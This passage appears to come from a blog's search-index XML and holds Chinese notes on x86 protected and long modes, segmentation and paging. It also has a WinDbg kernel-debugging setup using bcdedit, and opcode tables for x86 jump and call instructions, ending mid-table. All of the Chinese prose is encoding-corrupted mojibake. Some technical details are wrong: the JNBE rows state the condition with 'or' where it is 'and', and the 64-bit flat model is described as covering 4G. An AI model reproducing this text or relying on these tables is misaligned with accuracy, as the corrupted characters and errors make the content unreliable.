<code>æ®µæè¿°ç¬¦</code>ã€<code>ç³»ç»Ÿæè¿°ç¬¦</code>ã€‚ä¿æŠ¤æ¨¡å¼ä¸‹çš„æ®µå¯„å­˜å™¨é€šè¿‡è®¿é—®<code>æ®µæè¿°ç¬¦</code>ç¡®å®šæ‰€åœ¨çš„æ®µï¼Œè€Œä¸æ˜¯å·¦ç§»4ä½åç›´æ¥ä¸åœ°å€ç›¸åŠ ï¼›ä¿æŠ¤æ¨¡å¼æœ‰è®¸å¤šç¡¬ä»¶ç›´æ¥è§¦å‘çš„ä¿æŠ¤åŠŸèƒ½ï¼Œç³»ç»Ÿæè¿°ç¬¦ç”¨äºæ”¯æŒè¿™äº›åŠŸèƒ½çš„è§¦å‘ã€‚æ­¤å¤–ï¼Œä¿æŠ¤æ¨¡å¼ä¸­å¼•å…¥äº†<code>ç‰¹æƒçº§</code>ï¼Œ<code>0</code>ä¸ºæœ€é«˜çš„ç‰¹æƒçº§ï¼Œ<code>3</code>ä¸ºæœ€ä½çš„ç‰¹æƒçº§ï¼Œè¶Šé«˜çš„ç‰¹æƒçº§ï¼Œä¿æŠ¤åŠŸèƒ½è¶Šå¼±ï¼Œç¨‹åºè¶Šå®¹æ˜“æ§åˆ¶å¤„ç†å™¨çš„çŠ¶æ€ã€‚å†…æ ¸é€šå¸¸åœ¨<code>0</code>ç‰¹æƒçº§è¿è¡Œï¼Œæ™®é€šç¨‹åºé€šå¸¸åœ¨<code>3</code>ç‰¹æƒçº§è¿è¡Œã€‚åŒæ—¶ï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸­ä¹Ÿå¼•å…¥äº†åˆ†é¡µæœºåˆ¶ï¼ˆä¸æ˜¯å¿…é¡»å¼€å¯ï¼‰ã€‚32ä½çš„åŸºæœ¬åˆ†é¡µæœºåˆ¶ä½¿ç”¨ä¸€çº§é¡µè¡¨è¿›è¡Œå¯»å€ï¼Œèƒ½å¤Ÿæ˜ å°„4GBç©ºé—´ï¼Œå¼€å¯<code>PAE</code>åï¼Œåœ¨åŸå…ˆçš„ä»¥åŠé¡µè¡¨ä¸Šå¢åŠ äº†ä¸¤çº§é¡µè¡¨ï¼Œé€šè¿‡ç±»ä¼¼æ ‘çŠ¶çš„æ•°æ®ç»“æ„ä½¿å¾—ç›¸åŒå¤§å°çš„æœ€é«˜çº§é¡µè¡¨èƒ½å¤Ÿæ˜ å°„<code>64PB</code>çš„ç©ºé—´ã€‚<code>PAE</code>å¼€å¯åä½¿ç”¨36ä½ç‰©ç†åœ°å€ï¼Œä½¿å¾—ç‰©ç†åœ°å€å¯»å€èƒ½åŠ›æé«˜åˆ°äº†<code>64GB</code>ã€‚</p></blockquote><h3 id="é•¿æ¨¡å¼">é•¿æ¨¡å¼</h3><blockquote><p>ç”±<code>å®æ¨¡å¼</code>åˆ‡æ¢è€Œæ¥çš„<code>32ä½ä¿æŠ¤æ¨¡å¼</code>è¢«ç§°ä¸º<code>IA-32</code>æ¨¡å¼ã€‚ç”±äº64ä½æ¨¡å¼ä»…ä»…æ˜¯åœ¨<code>IA-32</code>æ¨¡å¼åŸºç¡€ä¸Šç»è¿‡ç®€å•çš„åŠŸèƒ½å¢å¼ºå’Œä¿®æ”¹å¾—åˆ°çš„ï¼Œæ‰€ä»¥è¢«ç§°ä¸º<code>IA-32e</code>æ¨¡å¼ã€‚</p><p>ä¸»è¦æœ‰è¿™äº›åŠŸèƒ½ï¼š<code>åˆ†é¡µæœºåˆ¶</code>ã€<code>é•¿æ¨¡å¼åœ°å€æ‰©å±•ï¼ˆLMEï¼‰</code>ã€<code>64ä½æ®µæè¿°ç¬¦</code>ã€‚<code>é•¿æ¨¡å¼åœ°å€æ‰©å±•</code>ä¸­ä¸ºåˆ†é¡µæœºåˆ¶åˆå¢åŠ äº†ä¸€çº§æˆ–ä¸¤çº§é¡µè¡¨ï¼Œä½¿ç”¨4çº§æˆ–5çº§é¡µè¡¨æ˜ å°„åœ°å€ç©ºé—´ã€‚åŒæ—¶ä½¿ç”¨48ä½ç‰©ç†åœ°å€ï¼Œè¿›ä¸€æ­¥æé«˜ç‰©ç†åœ°å€å¯»å€èƒ½åŠ›ã€‚ä¹Ÿå› ä¸º<code>48ä½ç‰©ç†åœ°å€</code>ç§°ä¸º<code>é•¿åœ°å€</code>ï¼Œ<code>IA-32e</code>æ¨¡å¼åˆç§°<code>é•¿æ¨¡å¼</code>ã€‚ç”±äºæè¿°ç¬¦è¡¨ä¸­æ”¯æŒ<code>32ä½æ®µæè¿°ç¬¦</code>å’Œ<code>64ä½æ®µæè¿°ç¬¦</code>åŒæ—¶å­˜åœ¨ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æš‚æ—¶å…³é—­<code>LME</code>å¹¶ä¿®æ”¹æ®µå¯„å­˜å™¨ç´¢å¼•çš„æ®µæè¿°ç¬¦ï¼Œè¿›å…¥ä¸€ç§æ”¯æŒ32ä½ç¨‹åºè¿è¡Œçš„<code>IA-32e</code>çš„å­æ¨¡å¼ï¼Œç§°ä¸º<code>å…¼å®¹æ¨¡å¼</code>ã€‚è™½ç„¶æ‰€è°“çš„<code>å…¼å®¹æ¨¡å¼</code>åªæ˜¯<code>IA-32e</code>æ¨¡å¼çš„ä¸€ç§æ”¯æŒ32ä½ç¨‹åºè¿è¡Œçš„<strong>çŠ¶æ€</strong>ï¼Œä½†æˆ‘ä»¬ä¾ç„¶ä¹ æƒ¯åœ°ç§°<code>IA-32eçš„æ”¯æŒ64ä½ç¨‹åºè¿è¡Œçš„çŠ¶æ€</code>å’Œ<code>IA-32eçš„æ”¯æŒ32ä½ç¨‹åºè¿è¡Œçš„çŠ¶æ€</code>ä¸º<code>IA-32e</code>çš„ä¸¤ä¸ªå­æ¨¡å¼<code>é•¿æ¨¡å¼</code>å’Œ<code>å…¼å®¹æ¨¡å¼</code>ã€‚</p></blockquote><h2 id="å†…å­˜å¸ƒå±€">å†…å­˜å¸ƒå±€</h2><h3 id="åˆ†æ®µ">åˆ†æ®µ</h3><p>é€šè¿‡æ®µå¯„å­˜å™¨åŠ åç§»çš„æ–¹å¼ç´¢å¼•çœŸå®ç‰©ç†åœ°å€</p><h3 id="åˆ†é¡µ">åˆ†é¡µ</h3><p>å­˜åœ¨çº¿æ€§è¿ç»­çš„è™šæ‹Ÿåœ°å€ï¼Œå¾—åˆ°è™šæ‹Ÿåœ°å€åï¼Œé€šè¿‡é¡µè¡¨æ˜ å°„åˆ°å¯¹åº”çš„ç‰©ç†åœ°å€</p><h3 id="åˆ†æ®µ-åˆ†é¡µ">åˆ†æ®µ+åˆ†é¡µ</h3><p>é€šè¿‡æ®µå¯„å­˜å™¨åŠ åç§»çš„æ–¹å¼ç´¢å¼•åˆ°è™šæ‹Ÿå†…å­˜ï¼Œé€šè¿‡é¡µè¡¨æ˜ å°„åˆ°å¯¹åº”çš„ç‰©ç†å†…å­˜</p><h3 id="å¹³å¦å†…å­˜æ¨¡å‹">å¹³å¦å†…å­˜æ¨¡å‹</h3><p>èˆå¼ƒäº†å¤§å¤šæ•°åˆ†æ®µæœºåˆ¶ï¼Œä¿ç•™äº†æ®µå¯„å­˜å™¨çš„æƒé™é™åˆ¶èƒ½åŠ›ã€‚åœ¨64ä½ä¸‹ï¼Œå¯ä»¥ç›´æ¥ç”¨å•ä¸€æ®µè®¿é—®æ•´ä¸ª4Gçš„è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œå› æ­¤æ¯ä¸ªæ®µçš„åŸºå€å‡ä¸º0ï¼Œæ— é™æ®µé•¿ï¼Œç›´æ¥ç”¨å¯¹åº”æƒé™çš„æ®µ+åç§»é‡ç´¢å¼•è™šæ‹Ÿåœ°å€ï¼Œç„¶åé€šè¿‡é¡µè¡¨æ˜ å°„åˆ°å¯¹åº”çš„ç‰©ç†å†…å­˜ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> winæ ¸å¿ƒ </category>
          
          <category> è®¡ç®—æœºç»„æˆåŸç† </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WinDbg-è°ƒè¯•ç¯å¢ƒæ­å»º</title>
      <link href="/posts/5c35dd38.html"/>
      <url>/posts/5c35dd38.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸‹è½½">ä¸‹è½½</h2><h3 id="ä¸‹è½½Win10é•œåƒ">ä¸‹è½½Win10é•œåƒ</h3><p>ç•¥</p><h3 id="ä¸‹è½½WinDbg">ä¸‹è½½WinDbg</h3><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/135mYBWw3S3B9-jkuMrm5Lg">https://pan.baidu.com/s/135mYBWw3S3B9-jkuMrm5Lg</a><br>æå–ç ï¼šw7j5</p><h2 id="å®‰è£…">å®‰è£…</h2><p>ç”¨VMwareå®‰è£…isoé•œåƒ</p><h2 id="é…ç½®">é…ç½®</h2><p>ä¸€å¼€å§‹æˆ‘ä½¿ç”¨äº†pipeå’Œcomå»è¿æ¥ï¼Œä½†æ˜¯å§‹ç»ˆè¿æ¥ä¸ä¸Šï¼Œå¦‚æœæƒ³ç”¨è¿™ç§æ–¹æ³•è¿æ¥ï¼Œå¯ä»¥çœ‹çœ‹è¿™ä¸ªåšå®¢</p><p><a href="https://xchen.cc/post/doubledebug/">æå®šWindbg ä¸²å£åŒæœºè°ƒè¯• - å¿†æ°çš„åšå®¢ - ä¸“æ³¨äºè½¯ä»¶é€†å‘ã€è°ƒè¯•ã€åè°ƒè¯•ã€å†…æ ¸å¼€å‘ã€ç¡¬ä»¶è™šæ‹ŸåŒ–</a></p><p>æ³¨æ„è¦è®©baudrateä¸€æ ·ï¼Œåœ¨è®¾å¤‡ç®¡ç†å™¨ä¸­é€‰æ‹©ç›¸åŒçš„é€Ÿç‡</p><h3 id="NETè¿æ¥">NETè¿æ¥</h3><p>ipconfigå¾—åˆ°æœ¬æœºipï¼Œå‡è®¾ä¸º127.0.0.1</p><h4 id="è™šæ‹Ÿæœºä¸­">è™šæ‹Ÿæœºä¸­</h4><p>ç®¡ç†å‘˜æ¨¡å¼è¾“å…¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /dbgsettings net hostip:ä¸»æœºip port:<span class="number">50000</span> key:<span class="number">1.1.1.1</span></span><br></pre></td></tr></table></figure><p>1.1.1.1å¯ä»¥ç”¨å…¶å®ƒçš„ã€‚</p><p>æ‰“å¼€è°ƒè¯•ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /<span class="literal">debug</span> <span class="literal">on</span></span><br></pre></td></tr></table></figure><p>æ‰“å¼€å¼•å¯¼è°ƒè¯•ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /bootdebug <span class="literal">on</span></span><br></pre></td></tr></table></figure><p>å…è®¸æµ‹è¯•ç­¾å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set testsigning <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><h4 id="è°ƒè¯•æœºä¸­">è°ƒè¯•æœºä¸­</h4><blockquote><p>æ‰“å¼€å¯¹åº”ä½æ•°çš„WinDbg</p><p>File -&gt; Kernel Debug</p><p>ç¬¬ä¸€ä¸ªé¡µé¢å°±æ˜¯NETï¼Œporté€‰50000ï¼Œkeyå¡«ä¸Šé¢å†™çš„key</p><p>ç„¶åWinDbgåº”è¯¥åœ¨ç­‰å¾…çŠ¶æ€ã€‚</p><p>é‡å¯è™šæ‹Ÿæœºï¼Œå³å¯çœ‹åˆ°è°ƒè¯•å¯åŠ¨ã€‚</p></blockquote><p>å¦‚æœæ˜¯æœ€æ–°ç‰ˆæœ¬çš„WinDbg</p><blockquote><p>æ–‡ä»¶-&gt;Attach to kernel</p><p>Netï¼Œè®¾ç½®ç«¯å£50000ï¼ŒKeyï¼Œç›´æ¥è¿æ¥</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ±‡ç¼–1-æ§åˆ¶è½¬ç§»</title>
      <link href="/posts/8f1f1d37.html"/>
      <url>/posts/8f1f1d37.html</url>
      
        <content type="html"><![CDATA[<p>æ±‡ç¼–æ˜¯å¦‚ä½•å®ç°æŒ‡ä»¤ä¹‹é—´çš„è·³è½¬</p><h3 id="æŒ‡ä»¤">æŒ‡ä»¤</h3><ul><li>JMPï¼Œè·³è½¬æŒ‡ä»¤</li><li>CALLï¼Œè¿‡ç¨‹è°ƒç”¨æŒ‡ä»¤</li><li>LOOPï¼Œå¾ªç¯æŒ‡ä»¤</li></ul><h3 id="æ®µå¯„å­˜å™¨">æ®µå¯„å­˜å™¨</h3><ul><li>CSï¼šcode segment æŒ‡ä»¤æ®µå¯„å­˜å™¨</li><li>DSï¼šdata segment æ•°æ®æ®µå¯„å­˜å™¨</li><li>SSï¼šstack segment æ ˆæ®µå¯„å­˜å™¨</li><li>ESï¼šä¸çŸ¥é“è‹±æ–‡ï¼Œä½†æ˜¯æ˜¯è¾…åŠ©æ®µå¯„å­˜å™¨</li><li>fs,gsï¼šä¸€èˆ¬å­˜æ“ä½œç³»ç»Ÿçš„çº¿ç¨‹æœ¬åœ°å­˜å‚¨</li></ul><h2 id="è·³è½¬æŒ‡ä»¤">è·³è½¬æŒ‡ä»¤</h2><table><thead><tr><th>æ“ä½œç </th><th>æŒ‡ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>EB <strong>cb</strong></td><td>JMP <strong>rel8</strong></td><td>ç›¸å¯¹çŸ­è·³è½¬ï¼Œä½ç§»é‡ç›¸å¯¹äºä¸‹ä¸€æ¡æŒ‡ä»¤</td></tr><tr><td>E9 <strong>cw</strong></td><td>JMP <strong>rel16</strong></td><td>ç›¸å¯¹è¿‘è·³è½¬ï¼Œä½ç§»é‡ç›¸å¯¹äºä¸‹ä¸€æ¡æŒ‡ä»¤</td></tr><tr><td>E9 <strong>cd</strong></td><td>JMP <strong>rel32</strong></td><td>ç›¸å¯¹è¿‘è·³è½¬ï¼Œä½ç§»é‡ç›¸å¯¹äºä¸‹ä¸€æ¡æŒ‡ä»¤</td></tr><tr><td>FF /4</td><td>JMP <strong>r/m16</strong></td><td>ç»å¯¹é—´æ¥è¿‘è·³è½¬ï¼Œåœ°å€ç”± <strong>r/m16</strong> ç»™å‡º</td></tr><tr><td>FF /4</td><td>JMP <strong>r/m32</strong></td><td>ç»å¯¹é—´æ¥è¿‘è·³è½¬ï¼Œåœ°å€ç”± <strong>r/m32</strong> ç»™å‡º</td></tr><tr><td>EA <strong>cd</strong></td><td>JMP <strong>ptr16:16</strong></td><td>ç»å¯¹è¿œè·³è½¬ï¼Œåœ°å€ç”±æ“ä½œæ•°ç»™å‡º</td></tr><tr><td>EA <strong>cp</strong></td><td>JMP <strong>ptr16:32</strong></td><td>ç»å¯¹è¿œè·³è½¬ï¼Œåœ°å€ç”±æ“ä½œæ•°ç»™å‡º</td></tr><tr><td>FF /5</td><td>JMP <strong>m16:16</strong></td><td>ç»å¯¹é—´æ¥è¿œè·³è½¬ï¼Œåœ°å€ç”± <strong>m16:16</strong> ç»™å‡º</td></tr><tr><td>FF /5</td><td>JMP <strong>m16:32</strong></td><td>ç»å¯¹é—´æ¥è¿œè·³è½¬ï¼Œåœ°å€ç”± <strong>m16:32</strong> ç»™å‡º</td></tr></tbody></table><p>åˆ†ä¸ºä¸‰ç§ï¼š</p><ul><li>æ®µå†…è·³è½¬ï¼šç”±æœ¬æ®µæ®µå¯„å­˜å™¨ä½œä¸ºåŸºå€+åç§»çš„è·³è½¬</li><li>ç›¸å¯¹è·³è½¬ï¼šç”±ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ä½œä¸ºåŸºå€+åç§»çš„è·³è½¬</li><li>è¿œè·³è½¬ï¼šç”±ä¸€ä¸ªæ®µå¯„å­˜å™¨ä½œä¸ºåŸºå€+åç§»çš„è·³è½¬</li><li>ä»»åŠ¡åˆ‡æ¢ï¼šç•¥ï¼ˆåˆ‡æ¢è¿›ç¨‹/çº¿ç¨‹ï¼‰</li></ul><h3 id="æ¡ä»¶è·³è½¬">æ¡ä»¶è·³è½¬</h3><table><thead><tr><th>æ“ä½œç </th><th>æŒ‡ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>77 <strong>cb</strong></td><td>JA <strong>rel8</strong></td><td>é«˜äºï¼ˆCF=0 ä¸” ZF=0ï¼‰æ—¶çŸ­è·³è½¬</td></tr><tr><td>73 <strong>cb</strong></td><td>JAE <strong>rel8</strong></td><td>é«˜äºæˆ–ç­‰äº (CF=0) æ—¶çŸ­è·³è½¬</td></tr><tr><td>72 <strong>cb</strong></td><td>JB <strong>rel8</strong></td><td>ä½äº (CF=1) æ—¶çŸ­è·³è½¬</td></tr><tr><td>76 <strong>cb</strong></td><td>JBE <strong>rel8</strong></td><td>ä½äºæˆ–ç­‰äºï¼ˆCF=1 æˆ–  ZF=1ï¼‰æ—¶çŸ­è·³è½¬</td></tr><tr><td>72 <strong>cb</strong></td><td>JC <strong>rel8</strong></td><td>è¿›ä½ (CF=1) æ—¶çŸ­è·³è½¬</td></tr><tr><td>E3 <strong>cb</strong></td><td>JCXZ <strong>rel8</strong></td><td>CX å¯„å­˜å™¨ä¸º 0 æ—¶çŸ­è·³è½¬</td></tr><tr><td>E3 <strong>cb</strong></td><td>JECXZ <strong>rel8</strong></td><td>ECX å¯„å­˜å™¨ä¸º 0 æ—¶çŸ­è·³è½¬</td></tr><tr><td>74 <strong>cb</strong></td><td>JE <strong>rel8</strong></td><td>ç­‰äº (ZF=1) æ—¶çŸ­è·³è½¬</td></tr><tr><td>7F <strong>cb</strong></td><td>JG <strong>rel8</strong></td><td>å¤§äºï¼ˆZF=0 ä¸” SF=OFï¼‰æ—¶çŸ­è·³è½¬</td></tr><tr><td>7D <strong>cb</strong></td><td>JGE <strong>rel8</strong></td><td>å¤§äºæˆ–ç­‰äº (SF=OF) æ—¶çŸ­è·³è½¬</td></tr><tr><td>7C <strong>cb</strong></td><td>JL <strong>rel8</strong></td><td>å°äº (SF&lt;&gt;OF)  æ—¶çŸ­è·³è½¬</td></tr><tr><td>7E <strong>cb</strong></td><td>JLE <strong>rel8</strong></td><td>å°äºæˆ–ç­‰äºï¼ˆZF=1 æˆ–  SF&lt;&gt;OFï¼‰æ—¶çŸ­è·³è½¬</td></tr><tr><td>76 <strong>cb</strong></td><td>JNA <strong>rel8</strong></td><td>ä¸é«˜äºï¼ˆCF=1 æˆ– ZF=1ï¼‰æ—¶çŸ­è·³è½¬</td></tr><tr><td>72 <strong>cb</strong></td><td>JNAE <strong>rel8</strong></td><td>ä¸é«˜äºæˆ–ç­‰äº (CF=1) æ—¶çŸ­è·³è½¬</td></tr><tr><td>73 <strong>cb</strong></td><td>JNB <strong>rel8</strong></td><td>ä¸ä½äº (CF=0) æ—¶çŸ­è·³è½¬</td></tr><tr><td>77 <strong>cb</strong></td><td>JNBE <strong>rel8</strong></td><td>ä¸ä½äºæˆ–ç­‰äºï¼ˆCF=0 æˆ–  ZF=0ï¼‰æ—¶çŸ­è·³è½¬</td></tr><tr><td>73 <strong>cb</strong></td><td>JNC <strong>rel8</strong></td><td>æ— è¿›ä½ (CF=0) æ—¶çŸ­è·³è½¬</td></tr><tr><td>75 <strong>cb</strong></td><td>JNE <strong>rel8</strong></td><td>ä¸ç›¸ç­‰ (ZF=0) æ—¶çŸ­è·³è½¬</td></tr><tr><td>7E <strong>cb</strong></td><td>JNG <strong>rel8</strong></td><td>ä¸å¤§äºï¼ˆZF=1 æˆ–  SF&lt;&gt;OFï¼‰æ—¶çŸ­è·³è½¬</td></tr><tr><td>7C <strong>cb</strong></td><td>JNGE <strong>rel8</strong></td><td>ä¸å¤§äºæˆ–ç­‰äº (SF&lt;&gt;OF)  æ—¶çŸ­è·³è½¬</td></tr><tr><td>7D <strong>cb</strong></td><td>JNL <strong>rel8</strong></td><td>ä¸å°äº (SFï¼OF) æ—¶çŸ­è·³è½¬</td></tr><tr><td>7F <strong>cb</strong></td><td>JNLE <strong>rel8</strong></td><td>ä¸å°äºæˆ–ç­‰äºï¼ˆZF=0 ä¸”  SF=OFï¼‰æ—¶çŸ­è·³è½¬</td></tr><tr><td>71 <strong>cb</strong></td><td>JNO <strong>rel8</strong></td><td>ä¸ä¸Šæº¢ (OF=0) æ—¶çŸ­è·³è½¬</td></tr><tr><td>7B <strong>cb</strong></td><td>JNP <strong>rel8</strong></td><td>å¥‡æ ¡éªŒ (PF=0) æ—¶çŸ­è·³è½¬</td></tr><tr><td>79 <strong>cb</strong></td><td>JNS <strong>rel8</strong></td><td>æ­£æ•°æ—¶ (SFï¼0) çŸ­è·³è½¬</td></tr><tr><td>75 <strong>cb</strong></td><td>JNZ <strong>rel8</strong></td><td>ä¸ä¸ºé›¶ (ZF=0) æ—¶çŸ­è·³è½¬</td></tr><tr><td>70 <strong>cb</strong></td><td>JO <strong>rel8</strong></td><td>ä¸Šæº¢ (OF=1) æ—¶çŸ­è·³è½¬</td></tr><tr><td>7A <strong>cb</strong></td><td>JP <strong>rel8</strong></td><td>å¶æ ¡éªŒ (PF=1) æ—¶çŸ­è·³è½¬</td></tr><tr><td>7A <strong>cb</strong></td><td>JPE <strong>rel8</strong></td><td>å¶æ ¡éªŒ (PF=1) æ—¶çŸ­è·³è½¬</td></tr><tr><td>7B <strong>cb</strong></td><td>JPO <strong>rel8</strong></td><td>å¥‡æ ¡éªŒ (PF=0) æ—¶çŸ­è·³è½¬</td></tr><tr><td>78 <strong>cb</strong></td><td>JS <strong>rel8</strong></td><td>è´Ÿæ•° (SF=1) æ—¶çŸ­è·³è½¬</td></tr><tr><td>74 <strong>cb</strong></td><td>JZ <strong>rel8</strong></td><td>ä¸ºé›¶ (ZF $\leftarrow$ 1) æ—¶çŸ­è·³è½¬</td></tr><tr><td>0F 87 <strong>cw/cd</strong></td><td>JA <strong>rel16/32</strong></td><td>é«˜äºï¼ˆCF=0 ä¸” ZF=0ï¼‰æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 83 <strong>cw/cd</strong></td><td>JAE <strong>rel16/32</strong></td><td>é«˜äºæˆ–ç­‰äº (CF=0) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 82 <strong>cw/cd</strong></td><td>JB <strong>rel16/32</strong></td><td>ä½äº (CF=1) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 86 <strong>cw/cd</strong></td><td>JBE <strong>rel16/32</strong></td><td>ä½äºæˆ–ç­‰äºï¼ˆCF=1 æˆ–  ZF=1ï¼‰æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 82 <strong>cw/cd</strong></td><td>JC <strong>rel16/32</strong></td><td>è¿›ä½ (CF=1) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 84 <strong>cw/cd</strong></td><td>JE <strong>rel16/32</strong></td><td>ç›¸ç­‰ (ZF=1) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 84 <strong>cw/cd</strong></td><td>JZ <strong>rel16/32</strong></td><td>ä¸º 0 (ZF=1) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 8F <strong>cw/cd</strong></td><td>JG <strong>rel16/32</strong></td><td>å¤§äºï¼ˆZF=0 ä¸”  SF=OFï¼‰æ—¶è¿‘è·³è½¬</td></tr></tbody></table><table><thead><tr><th>æ“ä½œç </th><th>æŒ‡ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>0F 8D <strong>cw/cd</strong></td><td>JGE <strong>rel16/32</strong></td><td>å¤§äºæˆ–ç­‰äº (SF=OF) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 8C <strong>cw/cd</strong></td><td>JL <strong>rel16/32</strong></td><td>å°äº (SF&lt;&gt;OF)  æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 8E <strong>cw/cd</strong></td><td>JLE <strong>rel16/32</strong></td><td>å°äºæˆ–ç­‰äºï¼ˆZF=1 æˆ–  SF&lt;&gt;OFï¼‰æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 86 <strong>cw/cd</strong></td><td>JNA <strong>rel16/32</strong></td><td>ä¸é«˜äºï¼ˆCF=1 æˆ– ZF=1ï¼‰æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 82 <strong>cw/cd</strong></td><td>JNAE <strong>rel16/32</strong></td><td>ä¸é«˜äºæˆ–ç­‰äº (CF=1) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 83 <strong>cw/cd</strong></td><td>JNB <strong>rel16/32</strong></td><td>ä¸ä½äº (CF=0) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 87 <strong>cw/cd</strong></td><td>JNBE <strong>rel16/32</strong></td><td>ä¸ä½äºæˆ–ç­‰äºï¼ˆCF=0 æˆ–  ZF=0ï¼‰æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 83 <strong>cw/cd</strong></td><td>JNC <strong>rel16/32</strong></td><td>æ— è¿›ä½ (CF=0) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 85 <strong>cw/cd</strong></td><td>JNE <strong>rel16/32</strong></td><td>ä¸ç›¸ç­‰ (ZF=0) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 8E <strong>cw/cd</strong></td><td>JNG <strong>rel16/32</strong></td><td>ä¸å¤§äºï¼ˆZF=1 æˆ–  SF&lt;&gt;OFï¼‰æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 8C <strong>cw/cd</strong></td><td>JNGE <strong>rel16/32</strong></td><td>ä¸å¤§äºæˆ–ç­‰äº (SF&lt;&gt;OF)  æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 8D <strong>cw/cd</strong></td><td>JNL <strong>rel16/32</strong></td><td>ä¸å°äº (SFï¼OF) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 8F <strong>cw/cd</strong></td><td>JNLE <strong>rel16/32</strong></td><td>ä¸å°äºæˆ–ç­‰äºï¼ˆZF=0 ä¸”  SF=OFï¼‰æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 81 <strong>cw/cd</strong></td><td>JNO <strong>rel16/32</strong></td><td>ä¸ä¸Šæº¢ (OF=0) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 8B <strong>cw/cd</strong></td><td>JNP <strong>rel16/32</strong></td><td>å¥‡æ ¡éªŒ (PF=0) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 89 <strong>cw/cd</strong></td><td>JNS <strong>rel16/32</strong></td><td>æ­£æ•° (SFï¼0) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 85 <strong>cw/cd</strong></td><td>JNZ <strong>rel16/32</strong></td><td>ä¸ä¸ºé›¶ (ZF=0) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 80 <strong>cw/cd</strong></td><td>JO <strong>rel16/32</strong></td><td>ä¸Šæº¢ (OF=1) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 8A <strong>cw/cd</strong></td><td>JP <strong>rel16/32</strong></td><td>å¶æ ¡éªŒ (PF=1) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 8A <strong>cw/cd</strong></td><td>JPE <strong>rel16/32</strong></td><td>å¶æ ¡éªŒ (PF=1) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 8B <strong>cw/cd</strong></td><td>JPO <strong>rel16/32</strong></td><td>å¥‡æ ¡éªŒ (PF=0) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 88 <strong>cw/cd</strong></td><td>JS <strong>rel16/32</strong></td><td>è´Ÿæ•° (SFï¼1) æ—¶è¿‘è·³è½¬</td></tr><tr><td>0F 84 <strong>cw/cd</strong></td><td>JZ <strong>rel16/32</strong></td><td>ä¸º 0 (ZF=1) æ—¶è¿‘è·³è½¬</td></tr></tbody></table><h2 id="è¿‡ç¨‹è°ƒç”¨æŒ‡ä»¤">è¿‡ç¨‹è°ƒç”¨æŒ‡ä»¤</h2><table><thead><tr><th>æ“ä½œç </th><th>æŒ‡ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>E8 <strong>cw</strong></td><td>CALL <strong>rel16</strong></td><td>ç›¸å¯¹è¿‘è°ƒç”¨ï¼Œä½ç§»é‡ç›¸å¯¹äºä¸‹ä¸€æ¡æŒ‡ä»¤</td></tr><tr><td>E8 <strong>cd</strong></td><td>CALL <strong>rel32</strong></td><td>ç›¸å¯¹è¿‘è°ƒç”¨ï¼Œä½ç§»é‡ç›¸å¯¹äºä¸‹ä¸€æ¡æŒ‡ä»¤</td></tr><tr><td>FF /2</td><td>CALL <strong>r/m16</strong></td><td>ç»å¯¹é—´æ¥è¿‘è°ƒç”¨ï¼Œåœ°å€ç”± <strong>r/m16</strong> ç»™å‡º</td></tr><tr><td>FF /2</td><td>CALL <strong>r/m32</strong></td><td>ç»å¯¹é—´æ¥è¿‘è°ƒç”¨ï¼Œåœ°å€ç”± <strong>r/m32</strong> ç»™å‡º</td></tr><tr><td>9A <strong>cd</strong></td><td>CALL <strong>ptr16:16</strong></td><td>ç»å¯¹è¿œè°ƒç”¨ï¼Œåœ°å€ç”±æ“ä½œæ•°ç»™å‡º</td></tr><tr><td>9A <strong>cp</strong></td><td>CALL 